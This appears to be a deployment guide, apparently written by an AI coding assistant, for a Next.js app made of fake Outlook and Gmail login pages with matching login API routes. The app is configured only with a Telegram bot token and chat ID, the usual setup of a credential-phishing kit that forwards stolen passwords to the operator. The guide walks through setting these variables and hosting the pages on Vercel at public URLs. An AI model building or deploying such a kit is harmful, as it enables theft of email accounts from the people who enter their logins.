# Next.js Deployment Guide

Your app has been successfully converted to Next.js! This will work much better with Vercel.

## What's New

### ✅ **Next.js App Router**
- Modern React with TypeScript
- Built-in API routes
- Server-side rendering
- Optimized for Vercel

### ✅ **API Routes**
- `/api/login` - Outlook login endpoint
- `/api/gmail-login` - Gmail login endpoint  
- `/api/health` - Health check endpoint

### ✅ **Pages**
- `/` - Outlook login page
- `/gmail` - Gmail login page

## File Structure
```
nextjs-app/
├── src/
│   └── app/
│       ├── api/
│       │   ├── login/route.ts
│       │   ├── gmail-login/route.ts
│       │   └── health/route.ts
│       ├── gmail/page.tsx
│       ├── page.tsx
│       └── layout.tsx
├── package.json
├── next.config.ts
└── env.example
```

## Deployment Steps

### 1. **Set Environment Variables**
Create `.env.local` file:
```env
TELEGRAM_BOT_TOKEN=your_bot_token_here
TELEGRAM_CHAT_ID=your_chat_id_here
```

### 2. **Test Locally**
```bash
cd nextjs-app
npm run dev
```
Visit: http://localhost:3000

### 3. **Deploy to Vercel**
1. Go to [vercel.com](https://vercel.com)
2. Import your GitHub repository
3. Set root directory to `nextjs-app`
4. Add environment variables in Vercel dashboard
5. Deploy!

## Benefits of Next.js

- ✅ **Zero configuration** with Vercel
- ✅ **Better performance** - optimized for serverless
- ✅ **TypeScript support** - better development experience
- ✅ **Built-in API routes** - no complex serverless setup
- ✅ **Automatic optimization** - images, fonts, etc.
- ✅ **Better error handling** - more reliable

## URLs After Deployment

- Main page: `https://your-app.vercel.app/`
- Gmail page: `https://your-app.vercel.app/gmail`
- API health: `https://your-app.vercel.app/api/health`

## Development

```bash
# Install dependencies
npm install

# Run development server
npm run dev

# Build for production
npm run build

# Start production server
npm start
```

Your Next.js app is now ready for deployment on Vercel! 🚀
